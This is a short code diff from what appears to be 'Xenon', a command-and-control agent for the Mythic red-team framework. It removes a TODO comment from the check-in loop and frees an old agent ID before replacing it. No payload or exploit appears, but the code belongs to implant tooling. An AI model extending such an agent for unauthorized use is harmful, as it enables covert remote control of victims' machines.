@@ -200,13 +200,6 @@ VOID XenonMain()
     PARSER data     = { 0 };
     BOOL bStatus    = FALSE;
 
-    
-    /*
-        TODO
-        - Remove retry sleep from HTTPX
-        - Move main sleep to here
-    */
-
     if ( !CheckinSend() )
     {
         _err("[CHCEKIN] Failed to checkin agent.");
@@ -223,9 +216,12 @@ VOID XenonMain()
     }
 }
 
+/* Update the Mythic Agent UUID */
 VOID XenonUpdateUuid(_In_ PCHAR newUUID)
 {
+    if ( xenonConfig->agentID )
+        LocalFree(xenonConfig->agentID);
+
     xenonConfig->agentID = newUUID;
-    return;
 }
 
